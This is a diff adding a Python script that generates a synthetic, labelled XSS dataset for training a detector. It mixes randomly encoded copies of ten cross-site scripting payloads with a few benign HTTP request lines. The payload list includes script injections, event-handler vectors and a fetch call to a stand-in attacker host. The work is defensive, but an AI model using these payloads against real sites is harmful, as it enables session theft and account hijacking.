@@ -1,0 +1,76 @@
+import random
+import pandas as pd
+
+# ---------------------------
+# Base XSS payloads
+# ---------------------------
+xss_payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<body onload=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<script>document.cookie</script>",
+    "<script>fetch('http://attacker.com')</script>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<link rel=stylesheet href=javascript:alert(1)>"
+]
+
+# ---------------------------
+# Benign requests
+# ---------------------------
+benign_requests = [
+    "GET /home HTTP/1.1",
+    "POST /login HTTP/1.1",
+    "GET /products?id=123 HTTP/1.1",
+    "GET /search?q=books HTTP/1.1",
+    "POST /checkout HTTP/1.1",
+    "GET /about HTTP/1.1",
+    "POST /api/user HTTP/1.1",
+    "GET /contact HTTP/1.1"
+]
+
+# ---------------------------
+# Encoding variations
+# ---------------------------
+def encode_payload(payload):
+    enc_type = random.choice(['none', 'url', 'html', 'mixed'])
+
+    if enc_type == 'url':
+        return ''.join(['%' + hex(ord(c))[2:] if random.random() < 0.3 else c for c in payload])
+
+    elif enc_type == 'html':
+        return payload.replace("<", "&lt;").replace(">", "&gt;")
+
+    elif enc_type == 'mixed':
+        p = payload.replace("<", "&lt;")
+        return ''.join(['%' + hex(ord(c))[2:] if random.random() < 0.2 else c for c in p])
+
+    return payload
+
+# ---------------------------
+# Generate dataset
+# ---------------------------
+data = []
+
+# 60,000 malicious
+for _ in range(60000):
+    payload = random.choice(xss_payloads)
+    payload = encode_payload(payload)
+    data.append([payload, 1])
+
+# 6,000 benign
+for _ in range(6000):
+    payload = random.choice(benign_requests)
+    data.append([payload, 0])
+
+# Shuffle
+random.shuffle(data)
+
+# Save
+df = pd.DataFrame(data, columns=["payload", "label"])
+df.to_csv("xss_dataset_large.csv", index=False)
+
+print("Dataset created: xss_dataset_large.csv")
+print("Total samples:", len(df))
